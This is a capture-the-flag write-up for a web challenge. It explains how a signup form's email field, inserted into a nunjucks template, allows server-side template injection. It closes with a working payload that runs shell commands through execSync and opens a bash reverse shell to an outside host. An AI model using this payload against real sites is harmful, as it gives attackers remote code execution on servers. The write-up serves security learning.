# Starfleet

Challenge text:
```
Do you enjoy unaliving humans as much as the next guy?
Welcome to Starfleet academy, the place where your mass genocide dreams come true. Enroll today!
```
Along with the [source code](web_starfleet).

This challenge was made to be quite hard, but had an unintended solution which made it a lot easier.

The website contains an input field, and if you fill in your email, you'll recieve an email telling you that your submission is being processed. There's nothing too interesting about this, so I check the source code.

```js
let message = {
    to: emailAddress,
    subject: 'Enrollment is now under review ✅',
};

let gifSrc = 'minimakelaris@hackthebox.eu';

message.html = nunjucks.renderString(`
    <p><b>Hello</b> <i>${ emailAddress }</i></p>
    <p>A cat has been deployed to process your submission 🐈</p><br/>
    <img width="500" height="350" src="cid:{{ gifSrc }}"/></p>
    `, { gifSrc }
);

message.attachments = [
    {
        filename: 'minimakelaris.gif',
        path: __dirname + '/../assets/minimakelaris.gif',
        cid: gifSrc
    }
];

let transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: 'cbctf.2021.web.newjucks@gmail.com',
        pass: '[REDACTED]',
    },
    logger: true
});

transporter.sendMail(message);
```
The only field we can control is the email address. After a bit of staring I decide to do a little research about nunjucks, the templating engine, as a lot of websites seem to be vulnerable to different templating attacks if the template is exposed to raw user-defined content. 

I come across a [GitHub issue](https://github.com/mozilla/nunjucks-docs/issues/17) which seems to contain exactly what I'm looking for. In nunjucks templates you can execute arbitrary code by creating a function and executing it with `{{ ({}).constructor.__proto__.constructor("code goes here")() }}`. With this you can execute shell commands, and get a reverse shell.

```js
{{ ({}).constructor.__proto__.constructor("process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/example.com/80 0>&1'`)")() }}
```

If we set our email to this and send it to the server while listening in netcat, we'll get access to the server, allowing us to read the flag.